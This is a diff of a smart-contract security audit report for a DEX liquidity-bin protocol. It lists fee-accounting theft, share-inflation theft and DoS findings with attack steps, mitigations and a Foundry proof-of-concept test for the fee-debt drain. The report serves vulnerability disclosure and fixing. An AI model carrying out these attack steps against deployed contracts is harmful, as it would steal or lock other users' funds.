@@ -1,31 +1,180 @@
 # Ignite Labs
 Ignite Labs Audit || Dec 2025
 
-My Finding Summary
+## Finding Summary
 |ID|Title|Severity|
 |:-:|:---|:------:|
+|[C-01](#c-01-fee-debt-not-updated-during-lp-token-transfers-allowing-historical-claims)|Fee Debt Not Updated During LP Token Transfers Allowing Historical Claims|CRITICAL|
+|[C-02](#c-02-when-compounding-lp-fees-user-could-steal-additional-assets)|When compounding LP fees user could steal additional assets|CRITICAL|
+|[C-03](#c-03-dos-attack---attacker-can-shift-the-activeid-bin-to-very-large-value)|DoS Attack - Attacker can shift the activeID bin to very large value|CRITICAL|
 |[H-01](#h-01-an-attacker-can-dos-liquidity-withdrawal-for-another-user-via-lptokenholder-with-just-1-lp-token)|An attacker can DOS liquidity withdrawal for another user via LpTokenHolder with just 1 Lp token|HIGH|
-|[M-01](#m-01-swaptokensforexacttokens-reverts-on-multi-hop-paths-due-to-hardcoded-fee-calculation-in-_getamountin-leading-to-dos)|swapTokensForExactTokens reverts on multi-hop paths due to hardcoded fee calculation|MEDIUM|
+|[H-02](#h-02-lp-fees-for-multi-bin-swaps-are-distributed-unfairly)|LP fees for multi bin swaps are distributed unfairly|HIGH|
+|[H-03](#h-03-compoundlpfees-breaks-bin-reserve-accounting)|compoundLPFees() Breaks Bin Reserve Accounting|HIGH|
+|[M-01](#m-01-swaptokensforexacttokens-reverts-on-multi-hop-paths-due-to-hardcoded-fee-calculation)|swapTokensForExactTokens reverts on multi-hop paths due to hardcoded fee calculation|MEDIUM|
 |[M-02](#m-02-sqrt-scaling-bug-causes-il-calculator-to-report-100-loss-for-any-price-movement)|Sqrt Scaling Bug Causes IL Calculator to Report 100% Loss for Any Price Movement|MEDIUM|
+|[M-03](#m-03-uniswapv3priceoraclegettwap-uses-spot-price-instead-of-twap)|UniswapV3PriceOracle::_getTWAP() Uses Spot Price Instead of TWAP|MEDIUM|
+|[M-04](#m-04-inaccurate-swap-quote-for-large-swaps-in-getdetailedswapquote)|Inaccurate Swap Quote for Large Swaps in getDetailedSwapQuote|MEDIUM|
+|[M-05](#m-05-swapquoteresulttotalfee-does-not-contain-correct-totalfee-value)|SwapQuoteResult.totalFee does not contain correct totalFee value|MEDIUM|
+|[M-06](#m-06-_calculateswapquote-function-uses-incorrect-fee-calculation)|_calculateSwapQuote function uses incorrect fee calculation due to bad formula|MEDIUM|
+|[M-07](#m-07-swap-dos-due-to-empty-bin-traversal-in-_performswap)|Swap DOS Due to Empty Bin Traversal in _performSwap|MEDIUM|
 |[L-01](#l-01-router_getpricefromownpair-hardcodes-binstep25-causing-incorrect-price-calculations)|Router:_getPriceFromOwnPair hardcodes binStep=25 causing incorrect price calculations|LOW|
 |[L-02](#l-02-oracle-updated-but-not-readable---dead-code-wastes-gas)|Oracle Updated But Not Readable - Dead Code Wastes Gas|LOW|
-
-## Technical Discussions & Contributions
-
-Throughout this audit, I actively engaged in technical discussions with other security researchers, demonstrating collaborative problem-solving and deep protocol understanding:
-
-- **#41 (SwapQuoteResult.totalFee)**: Acknowledged @10ap17's finding on incorrect fee accumulation across multi-hop swaps with different token decimals
-- **#58 (compoundLPFees theft)**: Participated in discussion about bin.totalShares not being updated during LP fee compounding, enabling fund theft
-- **#18 (LP fee distribution)**: Validated @10ap17's finding on unfair LP fee distribution during multi-bin swaps - "This is solid. @10ap17 nice"
-- **#26 (ActiveID DoS)**: Engaged in discussion about bitmap-based bin traversal to prevent DoS attacks
+|[L-03](#l-03-wrong-implementation-in-finding-uniswapv3-pool)|Wrong implementation in finding uniswapV3 pool|LOW|
+|[L-04](#l-04-hardcoded-25bp-bin-step-causes-wrong-calculations)|Hardcoded 25bp Bin Step causes Wrong Calculations|LOW|
+|[L-05](#l-05-users-could-artificially-increase-the-volatility-fee)|Users could artificially increase the volatility fee by executing small swaps|LOW|
 
 ----
 
+## [C-01] Fee Debt Not Updated During LP Token Transfers Allowing Historical Claims
+### Description
+
+When LP tokens are transferred via `safeTransferFrom()`, the `_userDebt` mapping that tracks already claimed fees is not updated. This breaks the fee accounting system:
+
+- Recipients can claim historical fees which they are not eligible for
+- Senders debt remains unchanged, reducing their claimable amount post-transfer
+- This attack can be repeated multiple times to drain the protocol reserves
+
+## Root Cause
+
+`_transfer` only updates `_balances`. It never updates `_userDebt` state variable.
+
+## Impact
+
+Funds can be drained from the protocol reserves.
+
+## POC
+
+```solidity
+function testExploit_SingleRecipientHistoricalClaim() public {
+    // 1) generate fees
+    _executeSwap(50_000e18);
+    (uint256 bobFeesX, ) = pair.getClaimableFees(bob, ACTIVE_BIN_ID);
+    console.log("bob fees accrued :", bobFeesX / 1e18);
+
+    _addInitialLiquidityAlice();
+
+    _executeSwap(50_000e18);
+
+    (uint256 aliceFeesX, ) = pair.getClaimableFees(alice, ACTIVE_BIN_ID);
+    require(aliceFeesX > 0, "no fees generated");
+    console.log("aliceFeesX:", aliceFeesX / 1e18);
+
+    // 2) prepare recipient and transfer a chunk of LP
+    address recipient = address(uint160(0x2000));
+    uint256 aliceLP = pair.balanceOf(alice, ACTIVE_BIN_ID);
+    console.log("Alice has ", aliceLP / 1e18, "LP's");
+
+    uint256 transferAmount = aliceLP;
+    vm.prank(alice);
+    pair.safeTransferFrom(alice, recipient, ACTIVE_BIN_ID, transferAmount);
+    console.log("Transferred", transferAmount / 1e18, "LP to recipient");
+
+    // 3) check claimable immediately after transfer
+    (uint256 recipientFeesX, ) = pair.getClaimableFees(recipient, ACTIVE_BIN_ID);
+    console.log("recipientClaimX:", recipientFeesX / 1e18);
+    console.log("Recipient can claim historical fees!");
+    
+    vm.prank(recipient);
+    (uint256 recipientFeesX_Received, ) = pair.claimLPFees(ACTIVE_BIN_ID, recipient);
+    assertTrue(recipientFeesX_Received > aliceFeesX, "functionality working as expected");
+}
+```
+
+**Logs:**
+```
+bob fees accrued : 134
+aliceFeesX: 67
+Alice has  1000000 LP's
+Transferred 1000000 LP to recipient
+recipientClaimX: 201
+As we could see recipient can claim historical fees as well!
+```
+
+## Mitigation
+
+Override `_transfer()` to update debt properly for both sender and receiver.
+
+---
+
+## [C-02] When compounding LP fees user could steal additional assets
+### Description
+
+The `compoundLPFee()` function allows malicious users (that have earned LP fee) to steal liquidity from other users within the bin. By compounding LP fee, the additionally added liquidity gets added to the reservesX/Y, also the liquidity gets minted to user, but the `bin.totalShares` doesn't get updated. This oversight allows malicious user to withdraw (burn) more liquidity than it owns, effectively stealing from other users.
+
+## Example
+
+1. User1 has the full liquidity of bin 8,388,608:
+   - reserveX: 5000 1e18
+   - reserveY: 5000 1e18
+   - totalShares: 10,000 1e18
+   - balanceOf(user1) = 10,000 1e18
+
+2. There are 200 1e18 accumulated fees of tokenX, and 400 1e18 accumulated fees of tokenY
+
+3. User1 calls `compoundLPFees` function to compound:
+   - claimableX is 200 1e18 and claimableY is 400 1e18
+   - liquidityMinted is 600 1e18
+
+4. The bin gets updated:
+   - reserveX: 5200 1e18
+   - reserveY: 5400 1e18
+   - totalShares: 10,000 1e18 (NOT UPDATED!)
+   - balanceOf(user1) = 10,600 1e18
+
+5. User1 withdraws 10,000 1e18 of his shares:
+   - Receives: 5200 1e18 tokenX and 5400 1e18 tokenY
+   - Still has 600 1e18 shares (minted during compounding)
+
+6. User1 waits for user2 to mint liquidity to this bin, then burns remaining 600 shares to steal additional tokens.
+
+## Impact
+
+Users who compound LP fees are able to steal additional funds from other users in the same bin.
+
+## Mitigation
+
+Consider adding newly minted shares to the `totalSupply` of the bin.
+
+---
+
+## [C-03] DoS Attack - Attacker can shift the activeID bin to very large value
+### Description
+
+The `_performSwap` function traverses bins with a safety limit of 100 bins. An attacker can shift the activeID bin to a very large value, making users unable to trade at the new price because to trade, activeID bin should move more than 100 bins.
+
+## Attack Scenario
+
+1. Admin creates a pool for stablecoin swap (trade happens around $1)
+2. Attacker backruns by providing LP with 1 Wei liquidity at every 99 bins from $1, many times
+3. Attacker performs swaps for that small amount of liquidity (fee will be zero)
+4. When swap happens from activeID bin at $1, it traverses and at bin 99 finds liquidity
+5. Same thing happens in a loop, shifting the price to $20
+6. Attacker removes all liquidity
+7. Legit LPs provide liquidity at $1 bin - but it sits unused as activeID is far away
+
+## Root Cause
+
+```solidity
+function _performSwap(...) internal returns (uint256 amountOut, uint256 binsTraversed) {
+    uint256 maxBinsToTraverse = 100; // Safety limit
+    // ... blindly incrementing binID instead of getting next active bin
+}
+```
+
+## Impact
+
+Users cannot trade at the current price. Transactions revert because activeID bin needs to move more than 100 bins.
+
+## Mitigation
+
+Implement bitmap-based next active bin search like UniswapV3 tick math, instead of linear traversal.
+
+---
 
 ## [H-01] An attacker can DOS liquidity withdrawal for another user via LpTokenHolder with just 1 Lp token
 ### Description
 
-An attacker can prevent legitimate users from withdrawing their liquidity by front-running their burn() transaction and donating a dust amount of LP tokens to the pair contract. This causes the victim's withdrawal to revert, temporarily locking their funds.
+An attacker can prevent legitimate users from withdrawing their liquidity by front-running their `burn()` transaction and donating a dust amount of LP tokens to the pair contract. This causes the victim's withdrawal to revert, temporarily locking their funds.
 
 ## Root Cause
 
@@ -37,232 +186,103 @@ address lpTokenHolder = balanceOf(address(this), ids.length > 0 ? ids[0].safe24(
     : msg.sender;
 ```
 
-This single-bin check is then applied to ALL bins in the withdrawal request. If an attacker donates even 1 LP token for the first bin to the pair contract, the function incorrectly assumes all LP tokens should be burned from the pair, not from the user's wallet.
+This single-bin check is then applied to ALL bins in the withdrawal request.
 
 ## Attack Scenario
 
-Alice (victim) holds LP tokens in bins [8388608, 8388609] in her wallet
-Bob (attacker) holds a small amount of LP tokens in bin 8388608
-
-**Step-by-Step Attack:**
-
 1. Alice submits a transaction to withdraw liquidity: `burn([8388608, 8388609], [50e18, 50e18], alice)`
-2. Bob sees Alice's pending transaction in the mempool
-3. Bob front-runs with: `safeTransferFrom(bob, pair, 8388608, 1)` - donating just 1 LP token to the pair contract
-4. Alice's transaction executes:
-   - `lpTokenHolder = balanceOf(pair, 8388608) > 0` evaluates to `1 > 0 = TRUE`
-   - Therefore `lpTokenHolder = address(pair)` instead of `alice`
-   - The loop checks: `balanceOf(pair, 8388608) >= 50e18` → `1 >= 50e18` → `FALSE`
-   - Transaction reverts with `LBPair__InsufficientLiquidity`
-5. Alice's withdrawal fails; her funds remain locked
+2. Bob front-runs with: `safeTransferFrom(bob, pair, 8388608, 1)` - donating just 1 LP token
+3. Alice's transaction executes but reverts with `LBPair__InsufficientLiquidity`
 
-**Result:**
-- Alice cannot withdraw her liquidity
-- Cost to attacker: Gas + 1 LP token (dust amount)
+**Result:** Alice cannot withdraw her liquidity. Cost to attacker: Gas + 1 LP token.
 
 ## Impact
 
 Legitimate users cannot withdraw their liquidity. An attacker can repeatedly DOS withdrawals at minimal cost.
 
-## POC
-
-```solidity
-function test_POC_DoS_lpTokenHolderManipulation() public {
-    // SETUP: Alice adds liquidity to multiple bins
-    uint256 amount = 100_000e18;
-    
-    token0.mint(alice, amount * 4);
-    token1.mint(alice, amount * 4);
-    token0.mint(bob, amount * 2);
-    token1.mint(bob, amount * 2);
-    
-    // Alice adds liquidity to TWO bins
-    vm.startPrank(alice);
-    token0.transfer(address(pair), amount);
-    token1.transfer(address(pair), amount);
-    
-    uint256[] memory ids = new uint256[](2);
-    uint256[] memory amounts = new uint256[](2);
-    ids[0] = ACTIVE_BIN_ID;
-    ids[1] = ACTIVE_BIN_ID + 1;
-    amounts[0] = amount * 2;
-    amounts[1] = amount;
-    
-    if (address(pairTokenY) == address(token0)) {
-        token0.transfer(address(pair), amount);
-    } else {
-        token1.transfer(address(pair), amount);
-    }
-    
-    pair.mint(ids, amounts, alice);
-    vm.stopPrank();
-    
-    // Bob gets minimal LP tokens
-    vm.startPrank(bob);
-    token0.transfer(address(pair), 100);
-    token1.transfer(address(pair), 100);
-    
-    uint256[] memory bobIds = new uint256[](1);
-    uint256[] memory bobAmounts = new uint256[](1);
-    bobIds[0] = ACTIVE_BIN_ID;
-    bobAmounts[0] = 200;
-    
-    pair.mint(bobIds, bobAmounts, bob);
-    vm.stopPrank();
-    
-    // ATTACK: Bob donates 1 LP token to pair contract
-    vm.startPrank(bob);
-    pair.safeTransferFrom(bob, address(pair), ACTIVE_BIN_ID, 1);
-    vm.stopPrank();
-    
-    // VICTIM: Alice tries to withdraw
-    uint256[] memory burnIds = new uint256[](2);
-    uint256[] memory burnAmounts = new uint256[](2);
-    burnIds[0] = ACTIVE_BIN_ID;
-    burnIds[1] = ACTIVE_BIN_ID + 1;
-    burnAmounts[0] = 50e18;
-    burnAmounts[1] = 50e18;
-    
-    vm.startPrank(alice);
-    
-    // ATTACK SUCCESS: Transaction reverts
-    vm.expectRevert(IUmbraeLBPair.LBPair__InsufficientLiquidity.selector);
-    pair.burn(burnIds, burnAmounts, alice);
-    
-    vm.stopPrank();
-}
-```
-
 ## Mitigation
 
-Check the LP token holder for each bin individually instead of relying on only the first bin's balance to determine the holder for all bins.
+Check the LP token holder for each bin individually.
 
 ---
 
-## [M-01] swapTokensForExactTokens reverts on multi-hop paths due to hardcoded fee calculation in _getAmountIn leading to DOS
+## [H-02] LP fees for multi bin swaps are distributed unfairly
+### Description
+
+When executing large swaps that require shifting of the activeBin (multi bin swaps), the last used bin (that now is the activeBin) gets the full lpFee amount, even though liquidity from previous bins was used during the swap. LPs from previous bins that provided liquidity do not get any reward.
+
+## Root Cause
+
+The `_updateBinFees` function is called at the end of the swap with the full LpFee amount and new active bin, so only the LP from that bin gets the full fee.
+
+## Example
+
+1. ActiveBin 666: reserveX: 1000e18, reserveY: 1000e18
+2. OtherBin 665: reserveX: 1000e18, reserveY: 0
+3. User swaps 1500e18 tokenY (after 10% fee = 1364e18, LpFee = 136e18)
+4. After swap in bin 666, amountInLeft is 364, so we go to bin 665
+5. Bin 665 becomes active, and `_updateBinFees` gives full 136e18 fee to bin 665 LPs
+6. Bin 666 LPs get nothing despite their liquidity being used
+
+## Impact
+
+Liquidity providers from startBin up until newActiveBin-1 do not get any LP fees earned during multi bin swaps.
+
+## Mitigation
+
+Change fee accrual logic so LPs from all traversed bins get their share of LP fees.
+
+---
+
+## [H-03] compoundLPFees() Breaks Bin Reserve Accounting
+### Description
+
+The `compoundLPFees()` function lets users deposit both tokens (X and Y) into any bin, even bins that are supposed to hold only one token, breaking the protocol invariant:
+
+- Below active price: only token X
+- Above active price: only token Y
+- At active price: mix of X + Y
+
+## Root Cause
+
+Normal `addLiquidity()` enforces this rule properly but `compoundLPFees()` ignores it completely as it blindly adds both X and Y to any bin making it imbalanced.
+
+When a user compounds LP fees:
+1. The contract reads claimable fees in token X and token Y
+2. It adds both values together (X + Y) to compute contributed liquidity
+3. LP shares are minted based on this summed value
+4. User later burns LP tokens and walks away with additional tokens for free
+
+## Impact
+
+Users can extract more value than they deposited by exploiting the accounting mismatch.
+
+## Mitigation
+
+Make `compoundLPFees()` behave like `addLiquidity()` - use LiquidityCalculator to split the fees correctly.
+
+---
+
+## [M-01] swapTokensForExactTokens reverts on multi-hop paths due to hardcoded fee calculation
 ### Description
 
 The `swapTokensForExactTokens` function supports multi-hop swaps (e.g., A → B → C → D), but the internal `_getAmountIn` function uses a hardcoded 0.3% fee that ignores the number of hops. This causes all multi-hop "exact output" swaps to revert because the calculated input amount is always insufficient.
 
 ## Root Cause
 
-Location: `UmbraeLBRouter._getAmountIn()` (lines 274-282)
-
-The function accepts path and binSteps parameters but completely ignores them:
-
 ```solidity
 function _getAmountIn(
     uint256 amountOut, 
-    address[] memory /* path */,      // IGNORED - should iterate hops
-    uint16[] memory /* binSteps */    // IGNORED - should account for fees per hop
+    address[] memory /* path */,      // IGNORED
+    uint16[] memory /* binSteps */    // IGNORED
 ) internal pure returns (uint256 amountIn) {
-    // Simplified - production would use quote functions
     amountIn = (amountOut * 10030) / 10000; // 0.3% fee - HARDCODED for ALL paths
-}
-```
-
-The function is called by `swapTokensForExactTokens`, which does support multi-hop paths:
-
-```solidity
-function swapTokensForExactTokens(
-    uint256 amountOut,
-    uint256 amountInMax,
-    address[] memory path,      // Can be [A, B, C, D] for multi-hop
-    uint16[] memory binSteps,   // One binStep per hop
-    address to,
-    uint256 deadline
-) external ensure(deadline) returns (uint256 amountIn) {
-    if (path.length < 2) revert LBRouter__InvalidPath();
-    if (path.length - 1 != binSteps.length) revert LBRouter__InvalidPath();
-    
-    // BUG: _getAmountIn ignores path.length
-    amountIn = _getAmountIn(amountOut, path, binSteps);
-    
-    // Transfer the (insufficient) calculated amount
-    _safeTransferFromVerified(IERC20(path[0]), msg.sender, ..., amountIn);
-    
-    // Execute multi-hop swap
-    _swap(path, binSteps, to);  // This correctly handles multi-hop
-    
-    // Check output - THIS REVERTS because input was insufficient
-    if (actualAmountOut < amountOut) revert LBRouter__InsufficientAmountOut();
 }
 ```
 
 ## Impact
 
-- **DoS on Multi-Hop Swaps**: `swapTokensForExactTokens` always reverts for paths with 2+ hops
-
-## POC
-
-```solidity
-function test_POC_Issue_GetAmountInDoS_MultiHop() public {
-    MockToken tokenC = new MockToken("Token C", "TKC");
-    
-    IERC20 actualTokenB = IERC20(pair.tokenY());
-    MockToken tokenBActual = MockToken(address(actualTokenB));
-
-    MockToken token0BC = tokenBActual;
-    MockToken token1BC = tokenC;
-    if (address(token0BC) > address(token1BC)) {
-        (token0BC, token1BC) = (token1BC, token0BC);
-    }
-
-    // Create B-C pair
-    address pairBC = factory.createPair(address(token0BC), address(token1BC), ACTIVE_BIN_ID, BIN_STEP);
-
-    // Add liquidity to B-C pair
-    uint256 liquidity = 100_000e18;
-    IERC20 tokenXBC = IERC20(UmbraeLBPair(pairBC).tokenX());
-    IERC20 tokenYBC = IERC20(UmbraeLBPair(pairBC).tokenY());
-
-    MockToken(address(tokenXBC)).mint(lp, liquidity);
-    MockToken(address(tokenYBC)).mint(lp, liquidity);
-
-    vm.startPrank(lp);
-    tokenXBC.transfer(pairBC, liquidity / 2);
-    tokenYBC.transfer(pairBC, liquidity / 2);
-
-    uint256[] memory ids = new uint256[](1);
-    uint256[] memory amounts = new uint256[](1);
-    ids[0] = ACTIVE_BIN_ID;
-    amounts[0] = liquidity;
-    UmbraeLBPair(pairBC).mint(ids, amounts, lp);
-    vm.stopPrank();
-
-    // User wants EXACTLY 5000 tokens C via multi-hop A -> B -> C
-    uint256 desiredExactOutput = 5_000e18;
-    uint256 maxInput = 10_000e18;
-
-    MockToken startToken = MockToken(address(pair.tokenX()));
-    startToken.mint(user, maxInput);
-
-    vm.startPrank(user);
-    startToken.approve(address(router), maxInput);
-
-    address[] memory path = new address[](3);
-    path[0] = address(startToken);
-    path[1] = address(tokenBActual);
-    path[2] = address(tokenC);
-
-    uint16[] memory binSteps = new uint16[](2);
-    binSteps[0] = BIN_STEP;
-    binSteps[1] = BIN_STEP;
-
-    // THE BUG: _getAmountIn calculates insufficient amount
-    vm.expectRevert(UmbraeLBRouter.LBRouter__InsufficientAmountOut.selector);
-    router.swapTokensForExactTokens(
-        desiredExactOutput,
-        maxInput,
-        path,
-        binSteps,
-        user,
-        block.timestamp + 1000
-    );
-
-    vm.stopPrank();
-}
-```
+DoS on Multi-Hop Swaps: `swapTokensForExactTokens` always reverts for paths with 2+ hops.
 
 ## Mitigation
 
@@ -273,192 +293,172 @@ Calculate input iteratively for each hop in the path.
 ## [M-02] Sqrt Scaling Bug Causes IL Calculator to Report 100% Loss for Any Price Movement
 ### Description
 
-The `calculateIL()` function in `ILCalculator.sol` computes impermanent loss using the standard IL formula: `IL = 2 * sqrt(r) / (1 + r) - 1`.
-
-However, when calling the `sqrt()` function on a 1e18-scaled number, the result is returned in 1e9 scale (since sqrt halves the decimal places).
-
-The code fails to restore the 1e18 scale after the sqrt operation, causing all subsequent calculations to be off by a factor of 1 billion. This results in the IL calculation reporting approximately -9999 basis points (-99.99% loss) for ANY price movement, regardless of actual magnitude.
+The `calculateIL()` function computes impermanent loss using sqrt on a 1e18-scaled number, but the result is in 1e9 scale. The code fails to restore the 1e18 scale, causing IL to report -9999 basis points (-99.99% loss) for ANY price movement.
 
 ## Root Cause
 
-In `ILCalculator.sol`, the `calculateIL()` function:
+```solidity
+uint256 sqrtRatio = sqrt(priceRatio);  // Returns 1e9 scale, not 1e18
+```
+
+## Impact
+
+- Any call to `calculatePositionIL()` returns approximately -99.99% IL regardless of actual price movement
+- `calculatePositionHealth()` shows all positions as "unhealthy"
+
+## Mitigation
 
 ```solidity
-function calculateIL(uint256 initialPriceRatio, uint256 currentPriceRatio)
-    internal pure returns (int256 ilPercentage)
-{
-    // priceRatio is 1e18 scaled (e.g., 2e18 represents 2.0)
-    uint256 priceRatio = (currentPriceRatio * 1e18) / initialPriceRatio;
+uint256 sqrtRatio = sqrt(priceRatio) * 1e9;  // Restore 1e18 scale
+```
 
-    // BUG: sqrt(2e18) = 1.414e9, NOT 1.414e18
-    // sqrt halves the decimal places: sqrt(1e18) = 1e9
-    uint256 sqrtRatio = sqrt(priceRatio);  // Returns 1e9 scale
+---
 
-    // Code assumes sqrtRatio is 1e18 scale
-    uint256 numerator = 2 * sqrtRatio;              // 2.828e9
-    uint256 denominator = 1e18 + priceRatio;        // 3e18
-    uint256 ratio = (numerator * 1e18) / denominator; // 0.9428e9 (should be 0.9428e18)
+## [M-03] UniswapV3PriceOracle::_getTWAP() Uses Spot Price Instead of TWAP
+### Description
 
-    // Comparison expects 1e18 scale
-    if (ratio >= 1e18) {
-        ilPercentage = 0;
+The UniswapV3PriceOracle contract returns spot prices instead of time-weighted average prices (TWAP). This needs to be fixed before deploying into mainnet as spot price can be manipulated easily.
+
+## Root Cause
+
+The oracle reads prices directly from `slot0()` instead of using `observe()` or `consult()` to compute a TWAP:
+
+```solidity
+function _getTWAP(address pool, uint32 period) internal view returns (uint256 price) {
+    (bool success, bytes memory data) = pool.staticcall(abi.encodeWithSignature("slot0()"));
+    // Returns SPOT price, not TWAP
+    uint256 priceX192 = uint256(sqrtPriceX96) * uint256(sqrtPriceX96);
+}
+```
+
+## Mitigation
+
+Implement proper TWAP using Uniswap's OracleLibrary.
+
+---
+
+## [M-04] Inaccurate Swap Quote for Large Swaps in getDetailedSwapQuote
+### Description
+
+The `getDetailedSwapQuote` function only reads reserves from the active bin when calculating swap quotes. For large swaps that would traverse multiple bins, the function reports drastically inflated price impact (up to 300x higher) and underestimated output amounts (up to 11x lower).
+
+## Root Cause
+
+```solidity
+function _fetchPairStates(...) internal view returns (PairState[] memory pairStates) {
+    (uint128 reserveX, uint128 reserveY) = pair.getBin(activeId);  // Only reads ONE bin
+}
+```
+
+## Impact
+
+- Users receive massively inaccurate quotes
+- Users set loose slippage protection based on bad quotes
+- MEV bots can exploit the large manipulation window
+
+## Mitigation
+
+Simulate bin traversal for accurate quotes.
+
+---
+
+## [M-05] SwapQuoteResult.totalFee does not contain correct totalFee value
+### Description
+
+Inside `_calculateSwapQuote` function, the logic for accumulating fees is incorrect since it assumes all fees are with the same decimals of precision and from the same token.
+
+## Example
+
+Path: USDC -> WETH -> WBTC, amountIn: 1000 1e6
+
+- First swap USDC -> WETH: fee = 3 * 1e6, totalFee = 3 * 1e6
+- Second swap WETH -> WBTC: fee = 2.991 * 1e18, totalFee = 3 * 1e6 + 2.991 * 1e18
+
+The totalFee adds fees from different tokens with different decimals.
+
+## Impact
+
+Total fee returned from `getDetailedSwapQuote` would be incorrect since it adds fees from different hops (each fee from each hop is in different tokens with different decimals and value).
+
+## Mitigation
+
+Consider making `totalFee` an array with length of hops.
+
+---
+
+## [M-06] _calculateSwapQuote function uses incorrect fee calculation
+### Description
+
+The `_calculateSwapQuote` function uses bad logic for calculating the fee. In LBPair contract, `getFeeAmountFrom` uses:
+
+```solidity
+(amount * totalFee) / (BASIS_POINTS + totalFee);
+```
+
+But in `_calculateSwapQuote` it calculates:
+
+```solidity
+(amount * 30) / 10000;
+```
+
+The result subtracts a higher fee than it should.
+
+## Impact
+
+TotalFee is calculated wrongly, returning amountOut smaller than it should.
+
+## Mitigation
+
+Use the `getFeeAmountFrom` formula.
+
+---
+
+## [M-07] Swap DOS Due to Empty Bin Traversal in _performSwap
+### Description
+
+The `_performSwap` function traverses bins sequentially (+1/-1) without using the existing `_activeBinsBitmap` to skip empty bins. Each empty bin counts toward the 100-bin safety limit, causing legitimate large swaps to revert when liquidity is sparse.
+
+## Root Cause
+
+```solidity
+function getNextActiveBin(uint24 currentBinId, bool swapForY) internal pure returns (uint24 nextBinId) {
+    if (swapForY) {
+        nextBinId = currentBinId + 1;  // Just +1, doesn't check for liquidity
     } else {
-        // (1e18 - 0.9428e9) ≈ 1e18, so loss ≈ 9999 basis points
-        uint256 loss = ((1e18 - ratio) * 10000) / 1e18;
-        ilPercentage = -int256(loss);  // Reports -9999 (99.99% loss)
+        nextBinId = currentBinId - 1;
     }
 }
 ```
 
 ## Impact
 
-- Any call to `calculatePositionIL()` returns approximately -99.99% IL regardless of actual price movement
-- The `calculatePositionHealth()` function receives the wrong IL value, causing all positions to show as "unhealthy" (score ~50 instead of ~95)
-
-## POC
-
-```solidity
-function test_POC_SqrtScalingBugInILCalculation() public {
-    // Setup: Add liquidity at the active bin (entry point)
-    _addLiquidityToActiveBin(alice, 100 ether, 100 ether);
-    
-    uint24 entryBinId = ACTIVE_ID;
-    
-    // Simulate price movement by doing swaps
-    vm.startPrank(bob);
-    tokenA.approve(address(pair), 50 ether);
-    tokenA.transfer(address(pair), 50 ether);
-    pair.swap(true, bob);
-    vm.stopPrank();
-    
-    // Prepare bin IDs for IL calculation
-    uint24[] memory binIds = new uint24[](1);
-    binIds[0] = ACTIVE_ID;
-    
-    // Call calculatePositionIL
-    (int256 totalILPercentage, uint256 inRangePercentage, uint8 healthScore) = 
-        pair.calculatePositionIL(alice, binIds, entryBinId);
-    
-    // BUG: IL reports >90% loss due to sqrt scaling issue
-    // Expected: ~-200 to -500 bps for a 50% reserve swap
-    // Actual: -9999 bps (99.99% loss)
-    assertTrue(
-        totalILPercentage < -9000, 
-        "BUG CONFIRMED: IL reports >90% loss due to sqrt scaling issue"
-    );
-    
-    // Health score incorrectly shows unhealthy position
-    assertTrue(
-        healthScore < 60,
-        "BUG CONFIRMED: Health score incorrectly shows unhealthy position"
-    );
-}
-```
-
-**Test outputs:**
-```
-calculatePositionIL returned: (-9999, 10000, 50)
-totalILPercentage = -9999  (reports 99.99% loss - WRONG)
-healthScore = 50           (shows unhealthy - WRONG)
-```
+Failed swaps during normal operation when liquidity gaps exist.
 
 ## Mitigation
 
-In `ILCalculator.sol`, multiply the sqrt result by 1e9 to restore 1e18 scale:
-
-```solidity
-// Before (buggy):
-uint256 sqrtRatio = sqrt(priceRatio);
-
-// After (fixed):
-uint256 sqrtRatio = sqrt(priceRatio) * 1e9;
-```
+Use bitmap to skip empty bins.
 
 ---
 
 ## [L-01] Router:_getPriceFromOwnPair hardcodes binStep=25 causing incorrect price calculations
 ### Description
 
-The protocol's factory allows creating pairs with multiple binStep values (10, 20, 25, 50, 100), but the Router's `_getPriceFromOwnPair` function hardcodes binStep=25 when calculating prices.
-
-This causes `getBinsAroundMarketPrice` and `getCurrentMarketBinId` to return completely wrong results for any pair not using binStep=25.
-
-## Root Cause
-
-The factory allows multiple binStep values:
-
-```solidity
-constructor(address _owner) Ownable(_owner) {
-    _allowedBinSteps[10] = true;   // 0.1%
-    _allowedBinSteps[20] = true;   // 0.2%
-    _allowedBinSteps[25] = true;   // 0.25%
-    _allowedBinSteps[50] = true;   // 0.5%
-    _allowedBinSteps[100] = true;  // 1%
-}
-```
-
-But the Router hardcodes binStep=25:
-
-```solidity
-function _getPriceFromOwnPair(address tokenA, address tokenB) internal view returns (uint256 price) {
-    address pair = FACTORY.getPair(tokenA, tokenB, 25);
-    // ... fallback logic finds pair with other binSteps ...
-    
-    IUmbraeLBPair lbPair = IUmbraeLBPair(pair);
-    uint24 activeId = lbPair.getActiveId();
-
-    // BUG: ALWAYS uses binStep=25, even if pair has binStep=100!
-    return BinHelper.getPriceFromId(activeId, 25);  // <-- HARDCODED 25
-}
-```
+The factory allows creating pairs with multiple binStep values (10, 20, 25, 50, 100), but the Router's `_getPriceFromOwnPair` function hardcodes binStep=25 when calculating prices.
 
 ## Impact
 
-- Wrong bin IDs returned from `getBinsAroundMarketPrice`
-- Liquidity placed at wrong price levels
-- Incorrect data from `getCurrentMarketPrice` and `getCurrentMarketBinId`
+Wrong bin IDs from `getBinsAroundMarketPrice` and incorrect market price data.
 
 ## Mitigation
 
-Fix `_getPriceFromOwnPair` to use the pair's actual binStep.
+Use the pair's actual binStep.
 
 ---
 
 ## [L-02] Oracle Updated But Not Readable - Dead Code Wastes Gas
 ### Description
 
-The `UmbraeLBPair.sol` contract updates an internal oracle during every swap, storing historical price and volatility data. However, the contract does not implement any external functions to read this data. The `IOracleManager` interface defines `getTWAP()`, `getVolatility()`, and `getLatestPrice()` functions, but none are implemented in `UmbraeLBPair.sol`. This results in gas being wasted on every swap for data that cannot be accessed.
-
-## Root Cause
-
-In `UmbraeLBPair.swap()`, the oracle is updated on every qualifying swap:
-
-```solidity
-// Update oracle
-if (OracleLibrary.shouldUpdate(_lastOracleUpdate)) {
-    _oracle.update(_activeId, _volatilityAccumulator);
-    _lastOracleUpdate = uint40(block.timestamp);
-    emit OracleUpdated(_activeId, _lastOracleUpdate);
-}
-```
-
-The `IOracleManager` interface defines read functions:
-
-```solidity
-interface IOracleManager {
-    function getTWAP(uint40 secondsAgo, uint40 windowSize) external view returns (uint24 averageId);
-    function getVolatility(uint40 secondsAgo, uint40 windowSize) external view returns (uint128 volatility);
-    function getLatestPrice() external view returns (uint24 activeId, uint40 timestamp);
-}
-```
-
-However, `UmbraeLBPair`:
-- Does NOT inherit from `IOracleManager`
-- Does NOT implement `getTWAP()`
